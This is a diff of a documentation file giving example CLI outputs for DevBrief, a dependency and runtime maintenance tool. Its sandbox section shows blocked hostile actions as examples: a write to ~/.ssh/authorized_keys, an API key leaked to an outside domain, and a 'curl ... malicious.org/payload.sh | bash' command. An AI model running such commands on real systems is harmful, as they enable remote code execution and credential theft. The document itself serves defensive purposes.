@@ -1,88 +1,125 @@
 # DevBrief Command Outputs Examples
 
-These examples illustrate the primary CLI outputs from the maintenance intelligence engine.
+These examples demonstrate the primary CLI outputs from the DevBrief Project Maintenance Intelligence engine, generated from the actual project code and included test fixtures.
 
 ---
 
-## 1. Full Scan (`devbrief doctor`)
+## 1. Flagship scan (`devbrief doctor`)
 
 Running a scan in a standard repository:
 
 ```bash
-npx devbrief doctor
+npx devbrief doctor --path examples/fixtures/npm-app
 ```
 
 ```text
-EOL: Node 20 is past EOL (2026-04-30)
-Health: 72/100
+EOL: Node 18 is past EOL (2025-04-30)
+Health: 38/100
 Breakdown:
-  Runtime Lifecycle:   15/25
-  Dependency Risk:     22/25
-  Infrastructure:      20/25
-  Security & Services: 15/25
+  Runtime Lifecycle:   0/25
+  Dependency Risk:     9/25
+  Infrastructure:      25/25
+  Security & Services: 4/25
 
-Detected: JavaScript/TypeScript (Next.js, React)
-Package manager: pnpm
-Scanned: 74 files, 118 dependencies, 2 runtime, 4 infra, 3 config/security, 1 service signals
+Detected: JavaScript/TypeScript (Express)
+Package manager: npm
+Scanned: 3 files, 3 dependencies, 1 runtime, 0 infra, 0 config/security, 0 service signals
 
-EOL: Node 20 is past EOL (2026-04-30) [package.json]
-  Evidence: smallest safe path: Node 22 or 24 LTS
+EOL: Node 18 is past EOL (2025-04-30)  [package.json]
+  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
   Decision: upgrade, 1 hour+, confidence: High
-  Why this matters: Security fixes and performance improvements no longer ship for EOL runtimes.
+  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).
 
-REVIEW: CORS origin is configured as wildcard [src/server.ts]
-  Evidence: CORS origin is '*'
-  Decision: review, 20 min, confidence: Medium
-  Why this matters: Permissive wildcards allow cross-origin requests from arbitrary websites.
+REVIEW: Express app has no helmet dependency  [package.json]
+  Evidence: add security headers if this serves public HTTP traffic
+  Decision: review, 5 min, confidence: Medium
+  Why this matters: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.
 
-Ignored: 5 low-signal items hidden by default
-Next: upgrade - Node 20 is past EOL (2026-04-30) (1 hour+)
+REVIEW: better-sqlite3 may need rebuilds on Node upgrades  [package.json]
+  Decision: review, 20 min, confidence: High
+  Why this matters: Drift in runtime versions between development and production can cause silent runtime crashes.
+
+REVIEW: Package "better-sqlite3" is declared in manifests but never imported in code  [package.json]
+  Evidence: safe to remove if not used for tooling or dynamic/peer loading
+  Decision: review, 5 min, confidence: High
+  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+Ignored: 7 low-signal items hidden by default
+Next: upgrade - Node 18 is past EOL (2025-04-30) (1 hour+)
 ```
 
 ---
 
 ## 2. Monorepo Breakdown Output
 
-When DevBrief detects multiple project manifests (e.g. Turborepo, pnpm workspaces), it automatically prints sub-project breakdowns:
+When DevBrief detects multiple project manifests (e.g. Turborepo, pnpm workspaces, sub-packages), it automatically prints sub-project health scores and directory breakdowns:
 
 ```bash
-npx devbrief doctor
+npx devbrief doctor --path examples/fixtures/monorepo
 ```
 
 ```text
-REVIEW: 3 project directories scanned
-Health: 88/100
+EOL: Node 20 is past EOL (2026-04-30)
+Health: 0/100
 Breakdown:
-  Runtime Lifecycle:   25/25
-  Dependency Risk:     20/25
-  Infrastructure:      20/25
-  Security & Services: 23/25
+  Runtime Lifecycle:   0/25
+  Dependency Risk:     0/25
+  Infrastructure:      0/25
+  Security & Services: 0/25
 
 Project Health Breakdown:
-  apps/web         92/100
-  apps/api         75/100
-  packages/shared  100/100
+  root             50/100
+  apps/api         100/100
+  apps/web         100/100
+  infra            50/100
 
-Detected: Go, JavaScript/TypeScript (Express, React)
-Package manager: pnpm, Go modules
-Scanned: 180 files, 210 dependencies, 2 runtime, 8 infra, 12 config/security signals
+Detected: JavaScript/TypeScript, Python, Container/Infra (Next.js, React, Python project, Containerized app)
+Package manager: pnpm, pip-compatible
+Project roots: ., apps/api, apps/web, infra
+Scanned: 5 files, 4 dependencies, 1 runtime, 1 infra, 0 config/security, 0 service signals
 
-RISKY: express-jwt has a known vulnerability [apps/api/package-lock.json]
-  Evidence: CVE-2020-15084
-  Decision: remediate, 20 min, confidence: High
-  Why this matters: High-risk vulnerabilities can be exploited to bypass authentication.
+EOL: Node 20 is past EOL (2026-04-30)  [infra/Dockerfile]
+  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
+  Decision: upgrade, 1 hour+, confidence: High
+  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).
 
-Next: remediate - express-jwt has a known vulnerability (20 min)
+EOL: Docker image pins an EOL or recently EOL Node runtime  [infra/Dockerfile]
+  Evidence: use a supported LTS image and test native dependencies
+  Decision: upgrade, 20 min, confidence: High
+  Why this matters: Drift in runner configurations or container engines leads to "works on my machine" deployment bugs.
+
+RISKY: Recently published package: fastapi  [package.json]
+  Evidence: published within the last 30 days (5/23/2026)
+  Decision: review, 20 min, confidence: High
+  Why this matters: Recently published packages have higher security risk as they have not been vetted by the community and are common targets for malware distribution.
+
+REVIEW: Package "fastapi" is declared in manifests but never imported in code  [package.json]
+  Evidence: safe to remove if not used for tooling or dynamic/peer loading
+  Decision: review, 5 min, confidence: High
+  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+REVIEW: Package "next" is declared in manifests but never imported in code  [package.json]
+  Evidence: safe to remove if not used for tooling or dynamic/peer loading
+  Decision: review, 5 min, confidence: High
+  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+REVIEW: Package "react" is declared in manifests but never imported in code  [package.json]
+  Evidence: safe to remove if not used for tooling or dynamic/peer loading
+  Decision: review, 5 min, confidence: High
+  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+Ignored: 9 low-signal items hidden by default
+Next: upgrade - Node 20 is past EOL (2026-04-30) (1 hour+)
 ```
 
 ---
 
 ## 3. Package Upgrade Advisor (`devbrief upgrade`)
 
-Checking whether upgrading a dependency is safe:
+Checking whether upgrading a dependency is safe by analyzing source code imports and version differentials:
 
 ```bash
-npx devbrief upgrade express --target 5.0.0
+npx devbrief upgrade express --target 5.0.0 --path examples/fixtures/npm-app
 ```
 
 ```text
@@ -91,39 +128,54 @@ Installed: 4.18.2
 Target: 5.0.0
 Effort: 20 min
 
-RISKY: express 4.18.2 -> 5.0.0 crosses a major version
-  Affected files: src/server.ts, src/api/users.ts
+RISKY: express 4.18.2 -> 5.0.0 crosses a major version  [src/server.ts]
+  Evidence: touches code you actually use in 1 file
   Decision: review, 20 min, confidence: High
-  Why this matters: Express 5 introduces breaking routing behaviors and changes query parser settings.
-
-Recommended action: Review routing handlers in the affected files and test endpoint behavior.
+  Why this matters: Major version updates cross breaking-change boundaries, meaning they change APIs and require code updates.
 ```
 
 ---
 
 ## 4. Inbox (`devbrief inbox`)
 
+Surf only the urgent items and quick safe wins:
+
 ```bash
-npx devbrief inbox
+npx devbrief inbox --path examples/fixtures/npm-app
 ```
 
 ```text
-INBOX: 1 urgent item needs attention
-Health: 78/100
+EOL: Node 18 is past EOL (2025-04-30)
+Health: 38/100
 Breakdown:
-  Runtime Lifecycle:   25/25
-  Dependency Risk:     15/25
-  Infrastructure:      20/25
-  Security & Services: 18/25
+  Runtime Lifecycle:   0/25
+  Dependency Risk:     9/25
+  Infrastructure:      25/25
+  Security & Services: 4/25
+
+Detected: JavaScript/TypeScript (Express)
+Package manager: npm
+Scanned: 3 files, 3 dependencies, 1 runtime, 0 infra, 0 config/security, 0 service signals
 
 Urgent:
-  RISKY: lodash has a known vulnerability [package-lock.json]
-    Evidence: CVE-2020-8203
-    Decision: remediate, 20 min, confidence: High
-    Why this matters: Vulnerabilities in utility libraries can trigger prototype pollution or denial of service.
+EOL: Node 18 is past EOL (2025-04-30)  [package.json]
+  Evidence: smallest safe path: Node 22 or 24 or 26 LTS
+  Decision: upgrade, 1 hour+, confidence: High
+  Why this matters: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).
 
 Safe wins:
-  (none — no low-effort, safe actions available)
+REVIEW: Express app has no helmet dependency  [package.json]
+  Evidence: add security headers if this serves public HTTP traffic
+  Decision: review, 5 min, confidence: Medium
+  Why this matters: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.
+
+REVIEW: Package "better-sqlite3" is declared in manifests but never imported in code  [package.json]
+  Evidence: safe to remove if not used for tooling or dynamic/peer loading
+  Decision: review, 5 min, confidence: High
+  Why this matters: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+Ignored: 7 low-signal items hidden by default
+Next: upgrade - Node 18 is past EOL (2025-04-30) (1 hour+)
 ```
 
 ---
@@ -147,7 +199,7 @@ npx devbrief fix
 
 ### Headless Mode (`devbrief fix --safe-only`)
 
-For non-TTY environments (like CI/CD pipelines), or to auto-apply low-risk, high-confidence upgrades:
+For non-TTY environments (like CI/CD pipelines) or automatic scripts, this applies low-risk, high-confidence upgrades:
 
 ```bash
 npx devbrief fix --safe-only
@@ -158,14 +210,10 @@ Upgrading package: lodash using npm in .
 added 1 package in 1s
 Upgrading package: axios using pnpm in apps/web
 added 1 package in 1s
-Upgrading Rust crate: serde in packages/rust-lib
-cargo add serde
-Upgrading Python package: requests in packages/py-app
-Rewrote packages/py-app/requirements.txt to set requests==2.32.3
 
-SUCCESS: Processed 4 safe fixes.
-Modified packages: lodash (npm), axios (pnpm), serde (cargo), requests (pip)
-Files changed: package.json, apps/web/package.json, packages/rust-lib/Cargo.toml, packages/py-app/requirements.txt
+SUCCESS: Processed 2 safe fixes.
+Modified packages: lodash (npm), axios (pnpm)
+Files changed: package.json, apps/web/package.json
 ```
 
 ---
@@ -175,40 +223,79 @@ Files changed: package.json, apps/web/package.json, packages/rust-lib/Cargo.toml
 Generating structured markdown summaries for CI/CD platforms (e.g. GitHub Actions summaries):
 
 ```bash
-npx devbrief doctor --format markdown
+npx devbrief doctor --format markdown --path examples/fixtures/npm-app
 ```
 
 ```markdown
 # DevBrief Project Maintenance Report
 
-**Health Score:** 72 / 100
+**Summary:** EOL: Node 18 is past EOL (2025-04-30)
+**Health Score:** 38/100
 
-Category | Score
----|---
-Runtime Lifecycle | 15 / 25
-Dependency Risk | 22 / 25
-Infrastructure | 20 / 25
-Security & Services | 15 / 25
+| Category | Score |
+| --- | --- |
+| **Runtime Lifecycle** | 0/25 |
+| **Dependency Risk** | 9/25 |
+| **Infrastructure** | 25/25 |
+| **Security & Services** | 4/25 |
 
 ## Findings
 
-<details>
-<summary><b>EOL: Node 20 is past EOL (2026-04-30)</b> [package.json]</summary>
-
-- **Decision:** upgrade, 1 hour+, confidence: High
-- **Files:** package.json
-- **Evidence:** smallest safe path: Node 22 or 24 LTS
-- **Why this matters:** Security fixes and performance improvements no longer ship for EOL runtimes.
-</details>
+### :warning: **EOL**: Node 18 is past EOL (2025-04-30) (`package.json`)
 
 <details>
-<summary><b>REVIEW: CORS origin is configured as wildcard</b> [src/server.ts]</summary>
+<summary>View details</summary>
 
-- **Decision:** review, 20 min, confidence: Medium
-- **Files:** src/server.ts
-- **Evidence:** CORS origin is '*'
-- **Why this matters:** Permissive wildcards allow cross-origin requests from arbitrary websites.
+- **Verdict / Action**: upgrade
+- **Effort**: 1 hour+
+- **Confidence**: High
+- **Evidence**: smallest safe path: Node 22 or 24 or 26 LTS
+- **Why this matters**: Security fixes and critical patches no longer ship after a runtime reaches End-of-Life (EOL).
+
 </details>
+
+### :warning: **REVIEW**: Express app has no helmet dependency (`package.json`)
+
+<details>
+<summary>View details</summary>
+
+- **Verdict / Action**: review
+- **Effort**: 5 min
+- **Confidence**: Medium
+- **Evidence**: add security headers if this serves public HTTP traffic
+- **Why this matters**: Weak security postures leave your endpoints vulnerable to scanning bots and automated attacks.
+
+</details>
+
+### :warning: **REVIEW**: better-sqlite3 may need rebuilds on Node upgrades (`package.json`)
+
+<details>
+<summary>View details</summary>
+
+- **Verdict / Action**: review
+- **Effort**: 20 min
+- **Confidence**: High
+- **Why this matters**: Drift in runtime versions between development and production can cause silent runtime crashes.
+
+</details>
+
+### :warning: **REVIEW**: Package "better-sqlite3" is declared in manifests but never imported in code (`package.json`)
+
+<details>
+<summary>View details</summary>
+
+- **Verdict / Action**: review
+- **Effort**: 5 min
+- **Confidence**: High
+- **Evidence**: safe to remove if not used for tooling or dynamic/peer loading
+- **Why this matters**: Unused dependencies bloat the container image size, slow down npm install times, and increase the security attack surface.
+
+</details>
+
+
+---
+*Generated by DevBrief Project Maintenance Intelligence.*
+```
 
 ---
 
@@ -219,6 +306,12 @@ Extracting hardcoded API keys and credentials into a local `.env` file and repla
 ```bash
 npx devbrief clean-secrets
 ```
+
+```text
+SAFE: No hardcoded secrets or AI placeholders found to refactor.
+```
+
+If secrets are found, they are extracted and replaced:
 
 ```text
 Scanning codebase for hardcoded secrets...
@@ -237,15 +330,13 @@ SUCCESS: Extracted 2 secrets and updated references.
 
 ## 8. Vibe Shield Sandbox (`devbrief shield -- <cmd>`)
 
-Running developer commands (like running untrusted agents, development tasks, or test suites) under sandbox execution guard:
+Conforming runtimes to sandbox execution limits:
 
 ```bash
 npx devbrief shield -- node app.js
 ```
 
 ### Example: Filesystem write outside workspace blocked
-
-If a compromised dependency or hallucinating agent tries to overwrite file buffers outside the project path:
 
 ```text
 ⚠️  [DevBrief Vibe Shield] BLOCKED: fs.writeFileSync - /Users/HP/.ssh/authorized_keys
@@ -254,8 +345,6 @@ Error: Permission Denied by Vibe Shield: fs.writeFileSync to /Users/HP/.ssh/auth
 
 ### Example: Outbound secret leak blocked
 
-If a script attempts to transmit your env credentials (e.g. OpenAI key) to an untrusted domain name:
-
 ```text
 ⚠️  [DevBrief Vibe Shield] BLOCKED: Secrets leak detected in HTTP request to logger.external-metrics.com for OPENAI_API_KEY
 Error: Connection Blocked by Vibe Shield: Secret Exfiltration Detected
@@ -263,12 +352,9 @@ Error: Connection Blocked by Vibe Shield: Secret Exfiltration Detected
 
 ### Example: Command injection blocked
 
-If code tries to run commands containing shell execution chains with unapproved downloader or utility scripts:
-
 ```text
 ⚠️  [DevBrief Vibe Shield] BLOCKED: child_process.spawn - curl -s http://malicious.org/payload.sh | bash
 Error: Permission Denied: command injection/unsafe command blocked by Vibe Shield
-```
 ```
 
 ---
